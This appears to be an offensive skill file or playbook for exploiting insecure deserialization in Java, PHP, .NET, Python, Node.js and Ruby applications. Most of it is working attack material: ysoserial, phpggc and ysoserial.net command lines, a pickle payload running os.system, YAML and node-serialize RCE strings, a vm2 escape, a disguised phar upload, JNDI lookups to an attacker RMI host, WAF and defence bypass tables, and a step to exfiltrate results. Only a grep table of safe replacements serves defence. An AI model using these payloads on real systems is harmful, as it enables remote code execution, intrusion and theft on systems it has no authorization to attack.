---
name: insecure-deserialization
category: vulnerabilities
description: Deserialization attacks across Java (ysoserial gadget chains), PHP (POP chains, phpggc), .NET (TypeNameHandling, ysoserial.net), Python (pickle, YAML.load, jsonpickle), Node.js (node-serialize, vm2 escapes), and Ruby (YAML.load, Marshal.load, erb)
depends_on: []
---

# Insecure Deserialization

Every major language has a "deserialize arbitrary object" API that becomes
RCE when the attacker controls the byte stream. The pattern: app takes
attacker-supplied bytes, reconstructs an object graph, and during
reconstruction, magic methods / constructors / callbacks fire — executing
attacker code.

## When to Use

- Target stores sessions in encoded blobs (base64, hex) in cookies / headers
- APIs accept `application/x-java-serialized-object`, `application/yaml`,
  `application/x-python-pickle`, binary protocols
- Target exposes `.NET` ViewState, SOAP envelopes, or binary RPC
- File upload features that accept `.pickle`, `.yml`, `.rb`, `.php` session files
- Cache / queue backends (Redis, Memcached, Kafka) users can influence

## Discovery Signals

Technology fingerprints that indicate deserialization surfaces before you
even send a payload. Look for these in intercepted traffic, responses, and
error pages.

| Signal | What It Indicates | Priority |
|--------|------------------|----------|
| `rO0AB` in base64 blob (cookie, header, param) | Java serialized object (`AC ED 00 05`) | Immediate |
| `Content-Type: application/x-java-serialized-object` | Java ObjectInputStream endpoint | Immediate |
| `O:N:"ClassName"` or `a:N:{` in cookie/param | PHP `unserialize()` sink | Immediate |
| `__VIEWSTATE` hidden field or cookie | .NET ObjectStateFormatter (needs machine key) | High |
| `$type` key in JSON request/response | JSON.NET TypeNameHandling enabled ($500K AppSheet RCE) | Immediate |
| `@type` or `@class` in JSON body | Jackson/Fastjson polymorphic typing | Immediate |
| `\x80\x02` through `\x80\x05` in decoded blob | Python pickle protocol | Immediate |
| `!!python/object` or `!!javax.script` in YAML | Unsafe YAML.load / SnakeYAML | Immediate |
| `/messagebroker/amf`, `/flex2gateway` URL path | Apache BlazeDS AMF endpoint (CVE-2017-5641) | High |
| `SESSION_SERIALIZER = PickleSerializer` in stacktrace | Django pickle session — RCE with leaked key (Facebook Sentry) | Immediate |
| `\x04\x08` magic bytes in decoded blob | Ruby Marshal.load | High |
| `_$$ND_FUNC$$_` in JSON value | node-serialize (always RCE) | Immediate |

## Language/Format Detection Matrix

Decode every base64/hex blob > 40 chars. Match magic bytes to identify the
serialization format, then select the right tool and exploitation path.

| Format | Magic Bytes / Pattern | Language | Primary Tool | Common Location |
|--------|----------------------|----------|-------------|-----------------|
| Java native | `AC ED 00 05` (`rO0AB` b64) | Java | ysoserial | Cookies, RMI, JMX, SOAP, AMF |
| PHP serialize | `O:N:"Class"` / `a:N:{` | PHP | phpggc | Cookies, session files, cache |
| Python pickle | `\x80\x02`..`\x80\x05` (binary) or `(c` (proto 0) | Python | hand-craft | Cookies, Redis, Celery, ML pipelines |
| Ruby Marshal | `\x04\x08` | Ruby | Universal chain | Cookies, Rails sessions, Redis |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` | C# | ysoserial.net | ViewState, remoting, MSMQ |
| .NET ViewState | `__VIEWSTATE=` base64 blob | C# | ysoserial.net | ASP.NET hidden form fields |
| JSON.NET ($type) | `{"$type":"..."}` in JSON | C# | ysoserial.net | API bodies, webhook configs |
| YAML (unsafe) | `!!python/object`, `!!javax.script` | Java/Python/Ruby | SnakeYAML/PyYAML gadgets | Config files, K8s manifests, CI/CD |
| Jackson (@type) | `{"@type":"..."}` or `{"@class":"..."}` | Java | marshalsec | REST APIs, microservices |
| MessagePack (typed) | `\xc7` ext type marker | Multi | format-specific | Binary APIs, game backends |
| AMF | `\x00\x03` (AMF3) | Java/Flash | BlazeDS exploits | Legacy Flex endpoints |
| node-serialize | `_$$ND_FUNC$$_` prefix | Node.js | direct payload | Express session stores |

## Gadget Chain Matrix

The gadget chain determines whether deserialization becomes RCE. Select
based on libraries present on the target's classpath/runtime.

| Language | Library/Runtime | Gadget Chain | Tool | Impact |
|----------|----------------|-------------|------|--------|
| Java | Commons Collections 1-7 | `InvokerTransformer` chain | ysoserial CC1-CC7 | RCE |
| Java | Commons BeanUtils | `BeanComparator` chain | ysoserial CommonsBeanutils1 | RCE |
| Java | Spring Framework | `MethodInvokeTypeProvider` | ysoserial Spring1-2 | RCE |
| Java | Groovy | `MethodClosure` | ysoserial Groovy1 | RCE |
| Java | JDK (no deps) | Proxy + AnnotationInvocationHandler | ysoserial Jdk7u21 | RCE |
| Java | SnakeYAML | `ScriptEngineManager` + `URLClassLoader` | marshalsec | RCE (K8s, Hyperledger) |
| Java | Any (detection only) | `java.net.URL` DNS lookup | ysoserial URLDNS | DNS callback |
| PHP | Monolog 1-3 | `BufferHandler` → `eval()` | phpggc Monolog/RCE1-6 | RCE |
| PHP | Laravel | `PendingBroadcast` chain | phpggc Laravel/RCE1-12 | RCE |
| PHP | Symfony | `FilteredInputStream` write | phpggc Symfony/FW1, RCE1-4 | RCE/file write |
| PHP | Guzzle | `FnStream` → `__destruct` | phpggc Guzzle/FW1 | File write |
| Python | stdlib (pickle) | `__reduce__` → `os.system` | hand-craft | RCE (Facebook Sentry) |
| Python | PyYAML | `!!python/object/apply:os.system` | hand-craft | RCE (K8s Gubernator) |
| Ruby | ERB + Deprecation | `DeprecatedInstanceVariableProxy` → ERB | universal chain | RCE (Rails sessions) |
| Ruby | Gem::Requirement | `Gem::DependencyList` chain | universal chain | RCE |
| .NET | PresentationFramework | `ObjectDataProvider` → `Process.Start` | ysoserial.net | RCE ($500K AppSheet) |
| .NET | mscorlib | `TypeConfuseDelegate` | ysoserial.net | RCE |
| .NET | System.Management | `PSObject` chain | ysoserial.net | RCE |
| .NET | WindowsIdentity | `ClaimsIdentity` chain | ysoserial.net | RCE |

## Blind Deserialization Detection

When no error messages or output is returned, use these out-of-band
techniques to confirm deserialization occurs.

| Technique | Payload Class | How to Confirm | Best For |
|-----------|-------------|---------------|----------|
| DNS callback | Java: `ysoserial URLDNS`; PHP: `phpggc` + DNS gadget; Python: `urllib.request.urlopen` in pickle | DNS hit on OAST domain | All languages — always try first |
| Time delay | Python: `time.sleep(10)` in pickle `__reduce__`; Java: `Thread.sleep()` gadget | Response delayed by N seconds | Blind endpoints, no outbound network |
| Error-based | Send valid-format garbage (wrong class name) vs well-formed payload | Different error messages / status codes | Confirming format without RCE |
| File write | PHP: `phpggc Symfony/FW1` writes to webroot; Python: pickle `open().write()` | Fetch the written file via HTTP | PHP targets with writable webroot |
| HTTP callback | Java: `JdbcRowSetImpl` JNDI to attacker LDAP; .NET: `ObjectDataProvider` + `WebClient` | HTTP hit on attacker listener | Java/NET targets with outbound HTTP |
| RMI/JNDI lookup | Java: `UnicastRef` triggers RMI to attacker host (BlazeDS AMF pattern) | TCP connect on attacker port | Java targets — proves deser + classpath |

## Java Deserialization

### Gadget chain generation (ysoserial)

```bash
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# RCE payload (pick chain from Gadget Chain Matrix above)
java -jar ysoserial-all.jar CommonsCollections5 "curl https://OAST.DOMAIN" > payload.bin
base64 -w0 payload.bin

# Detection-only (DNS callback, no RCE — always try first)
java -jar ysoserial-all.jar URLDNS http://YOUR-OAST.interactsh.com > urldns.bin
base64 -w0 urldns.bin
```

### Non-Java-stdlib serializers

- **Jackson / Gson with TypeNameHandling**:
  ```json
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/x"}
  ```
- **XMLDecoder** (older JDK class, `java.beans`): XML-based gadget
- **SnakeYAML** (`Yaml.load`): `!!javax.script.ScriptEngineManager ...`

## PHP Deserialization

### Gadget chain generation (phpggc)

```bash
git clone https://github.com/ambionics/phpggc && cd phpggc
./phpggc -l                                         # list all chains
./phpggc Symfony/FW1 system 'curl OAST.DOMAIN'      # generate RCE payload
./phpggc -b Monolog/RCE6 system 'id'                # base64-encode (monolog is ubiquitous)
```

### Phar deserialization (file-upload path)

When target uses `file_exists()`, `fopen()`, `file_get_contents()` on
user-controlled paths, a `.phar` file's metadata is unserialized during the
stat call.

```bash
./phpggc Monolog/RCE6 system 'id' --phar phar -o evil.phar
# Upload evil.phar as any filename (even evil.jpg!)
# Trigger with path containing phar://evil.jpg
```

Even `getimagesize('phar://uploads/evil.jpg/fake.jpg')` triggers.

### Magic methods that fire

- `__destruct()` -- always fires on cleanup
- `__wakeup()` -- fires on unserialize
- `__toString()` -- fires on string cast
- `__call()` / `__get()` / `__set()` -- fires in POP chain

## .NET Deserialization

### Gadget generation (ysoserial.net)

```bash
git clone https://github.com/pwntester/ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"  # $500K AppSheet gadget
```

### Json.NET TypeNameHandling attacks

```json
{"$type":"System.IO.FileInfo, System.IO.FileSystem","fileName":"rce.txt"}
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c calc"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

### ViewState

`__VIEWSTATE` is base64 ObjectStateFormatter. If machine key leaks (via LFI
on config file), sign+generate with ysoserial.net:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami > c:/inetpub/wwwroot/pwn.txt" \
  --validationalg="SHA1" --validationkey="<leaked key>" \
  --decryptionalg="AES" --decryptionkey="<leaked key>"
```

## Python Deserialization

### pickle

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

payload = pickle.dumps(Exploit())
# Send as: base64.b64encode(payload)
```

### YAML.load (silent killer)

```yaml
!!python/object/apply:os.system ["id"]
```

Other sinks: `jsonpickle`, `shelve`, `marshal`, `dill` -- all same RCE class.

## Node.js Deserialization

### node-serialize (rare but always RCE)

```javascript
const payload = '_$$ND_FUNC$$_function(){require("child_process").exec("id", (e,s,stderr)=>{})}()';
```

### Prototype pollution as deserialization

See `prototype_pollution.md`. `JSON.parse` + `Object.assign(existing, parsed)`
on attacker JSON with `__proto__` key pollutes global prototype -- often
escalates to RCE via `child_process` option gadgets.

### vm2 / vm sandbox escapes

```javascript
// Famous vm2 escape (CVE-2023-37466) — varies per version:
const x = {toString: () => { process.mainModule.require('child_process').execSync('id'); return ''; }};
x.toString();
```

## Ruby Deserialization

`YAML.load` / `Marshal.load` (`\x04\x08` magic) -- both RCE if attacker
controls input. Universal gadget: `DeprecatedInstanceVariableProxy` wrapping
ERB (see Gadget Chain Matrix). `Psych.unsafe_load` is the renamed danger API.
See `ssti.md` for ERB template injection.

## Format-Specific Bypass Techniques

WAFs and input filters often block known deserialization payloads. These
encoding and format tricks evade common defenses.

| Format | Bypass Technique | How It Works |
|--------|-----------------|-------------|
| Java native | Wrap in `TC_RESET` markers (`0x79`) | Resets stream state, breaks signature-based WAF matching |
| Java native | Gzip-compress then base64 | Many endpoints auto-decompress; WAF sees only compressed bytes |
| Java YAML | Nested `!!` tag with whitespace | `!! javax.script.ScriptEngineManager` bypasses exact-string WAFs |
| PHP serialize | URL-encode `O:` as `O%3A` then double-decode | Works when target double-decodes input before unserialize |
| PHP phar | Rename `.phar` to `.jpg`/`.gif`, prepend image header | Bypasses extension filters; `phar://` ignores file extension |
| .NET JSON | Split `$type` across Unicode escapes (`$type`) | JSON.NET decodes Unicode escapes before processing `$type` |
| .NET ViewState | Use `__VIEWSTATEGENERATOR` to derive encryption params | Avoids needing full key leak; generator value is in page source |
| Python pickle | Use protocol 0 (ASCII) instead of binary | ASCII `cos\nsystem\n(S'cmd'\ntR.` evades binary-pattern WAFs |

## Defense-Bypass Pairs

When a target has a specific defense mechanism, use the corresponding
bypass. Derived from corpus patterns including the $500K AppSheet and
Apigee cache-escape reports.

| Defense | Bypass Strategy | Real-World Example |
|---------|----------------|-------------------|
| JSON schema validation (rejects unknown keys) | `$type` in nested object, not top-level | AppSheet webhook body — deser honored `$type` in sub-objects |
| Java SecurityManager sandbox | Store gadget in cache, retrieve via unsandboxed hook | Apigee $133K — JavaCallout sandboxed, LookupCache not |
| `TypeNameHandling.Auto` (only polymorphic fields) | Target a field declared as `object` or interface type | JSON.NET deserializes `$type` on any `Auto`-marked field |
| Django SECRET_KEY snipped from stacktrace | Find app-specific secret in sub-dict (e.g., `SENTRY_OPTIONS`) | Facebook Sentry — `system.secret-key` not in Django snip-list |
| `enable_xcom_pickling=False` (config flag) | Find code path that bypasses the config check | Airflow XCom — alternate deser path ignored the flag |
| `yaml.safe_load` enforced at app layer | Find library that internally calls `yaml.load` | SnakeYAML default constructor in K8s Java client, Hyperledger |
| Allowlist on deserialized class names | Use intermediate class that loads the blocked class | Java: `UnicastRef` triggers RMI to attacker-hosted gadget |
| WAF blocks `ysoserial` payload signatures | Use less-common chain (ROME, BeanShell, Jdk7u21) | DoD BlazeDS — `UnicastRef` not in WAF signature set |

## Chain Patterns

Deserialization is frequently the entry point for a multi-step attack.
These chains combine deser with other vulnerability classes.

| Chain Pattern | Entry | Pivot | Final Impact | Corpus Reference |
|--------------|-------|-------|-------------|-----------------|
| Deser -> RCE (direct) | Java/PHP/Python object stream | Gadget chain fires during reconstruction | Command execution | AppSheet $500K, Facebook Sentry $5K |
| Deser -> SSRF/JNDI -> RCE | Java `UnicastRef` or `JdbcRowSetImpl` | RMI/LDAP lookup to attacker server | Remote class loading -> RCE | BlazeDS AMF $1.7K, Log4Shell pattern |
| Deser -> sandbox escape -> RCE | Sandboxed code writes gadget to cache | Unsandboxed hook deserializes from cache | Privileged RCE | Apigee $133K |
| Leaked secret -> forged token -> deser RCE | Debug page / stacktrace leaks signing key | Forge signed session cookie with gadget | RCE as web server | Facebook Sentry (Django), Rails ActiveStorage |
| File upload -> phar:// -> deser -> RCE | Upload `.phar` disguised as image | `file_exists()` / `getimagesize()` on phar:// path | PHP gadget chain fires | PHP phar research, phpggc |
| Config poisoning -> YAML deser -> RCE | PR/commit modifies YAML config file | App loads config with unsafe `yaml.load` | RCE in CI/CD or service | K8s Gubernator, Hyperledger Fabric |
| Prototype pollution -> RCE | `__proto__` in JSON.parse | Polluted property reaches `child_process` spawn options | Command execution | Node.js ecosystem |
| Deser -> DoS (resource bomb) | Deeply nested object graph or billion-laughs | Parser exhausts CPU/memory during reconstruction | Service denial | PHP unserialize OOB, WDDX crashes |

## Source-Level Grep Patterns

When reviewing source code (white-box or after gaining read access), these
grep patterns identify deserialization sinks. Each hit is a candidate RCE
if attacker-controlled input reaches it.

| Language | Dangerous Pattern (grep) | Safe Replacement |
|----------|-------------------------|------------------|
| Java | `ObjectInputStream.readObject()` | JEP 290 filter, JSON |
| Java | `new Yaml().load(` (SnakeYAML) | `new Yaml(new SafeConstructor())` |
| Java | `enableDefaultTyping()` (Jackson) | `@JsonTypeInfo` allowlist |
| Java | `XMLDecoder(` | Remove or allowlist |
| Python | `pickle.loads(`, `pickle.load(` | JSON, restricted unpickler |
| Python | `yaml.load(` without `Loader=SafeLoader` | `yaml.safe_load()` |
| Python | `marshal.loads(`, `dill.loads(` | JSON |
| PHP | `unserialize($` on user input | `json_decode()` |
| Ruby | `YAML.load(`, `Marshal.load(` | `YAML.safe_load()`, JSON |
| Ruby | `JSON.load(` (capital L) | `JSON.parse()` |
| .NET | `BinaryFormatter.Deserialize(` | JSON, MessagePack |
| .NET | `TypeNameHandling` != `None` | `TypeNameHandling.None` |
| Node.js | `serialize.unserialize(` | `JSON.parse()` |

## Common Methodology

### Phase 1: Sniff

1. Intercept every request. Look for base64 / hex blobs > 40 chars
2. Decode promising blobs, magic-byte match against Detection Matrix
3. Identify format precisely (Java CC5 vs CC6 matters for exploit gen)

### Phase 2: Confirm

Use a **DNS-only detection gadget**:
- Java: `ysoserial URLDNS http://x.OAST.DOMAIN`
- PHP: `phpggc` with assert-style confirm payload hitting OAST
- Python: pickle with `urllib.request.urlopen("http://x.OAST.DOMAIN")`

Send. Watch OAST. DNS hit -> format confirmed.

### Phase 3: Exploit

1. Enumerate classpath (Java) -- error messages leak class names
2. Pick gadget chain matching classpath (see Gadget Chain Matrix)
3. Generate payload for command exec
4. Send, exfil result

## Tooling

| Language | Primary | Alternative |
|----------|---------|-------------|
| Java | **ysoserial** | marshalsec, JNDIExploit |
| PHP | **phpggc** | custom POP chain |
| .NET | **ysoserial.net** | custom ObjectDataProvider payload |
| Python | pickle module (hand-craft) | jsonpickle, dill |
| Node.js | node-serialize payloads | prototype-pollution gadgets |
| Ruby | Universal RCE chain | ERB + DeprecatedInstanceVariableProxy |
| Detection | DNS-only canaries, Burp Collaborator, interactsh | URLDNS, time-delay |

## Pro Tips

1. URLDNS / OAST-only confirm gadgets save time -- never jump to RCE before confirming format
2. Classpath dictates chain -- try CC1, if no hit try CC2...CC7, then ROME, BeanShell, Jdk7u21
3. Magic bytes are your fastest signal -- any blob starting `rO0AB`, `\x80\x02`, `AC ED`, `\x04\x08` is worth 10 min
4. Base64 vs hex vs URL-encoded base64 -- test all three wrappings
5. .NET ViewState needs the machine key -- enumerate local file read first
6. Phar trick is underused -- if PHP + file upload exists, always try `phar://` via `file_exists`/`getimagesize`
7. YAML is deceptively dangerous -- devs assume safe, use `yaml.load` over `safe_load` (found in K8s, Hyperledger, Airflow)
8. Library upgrades matter -- keep ysoserial / phpggc / ysoserial.net updated monthly
9. Exploitation before detection = false negative -- DNS first, then RCE
10. Webhook/callback builders are prime .NET targets -- any "send HTTP with user body" feature likely deserializes the body server-side (AppSheet pattern)
11. Internal stores (Redis, Memcached) are not trust boundaries -- if attacker can write to the store, any reader with loose deserialization inherits RCE (Kredis CVE-2023-27531)
12. Always include a negative control -- send collaborator URL as plain body first (no deser), then inside the gadget; proves deser, not body-string scanning (BlazeDS methodology)
13. Scheduled/async jobs expand the surface -- even if synchronous deser is gated, delayed execution (bots, crons, queue consumers) may deserialize in a different, less-restricted context (AppSheet monthly bot)
14. Config flags claiming to disable dangerous deser may have bypass paths -- audit every code path, not just the gated one (Airflow `enable_xcom_pickling` bypass)
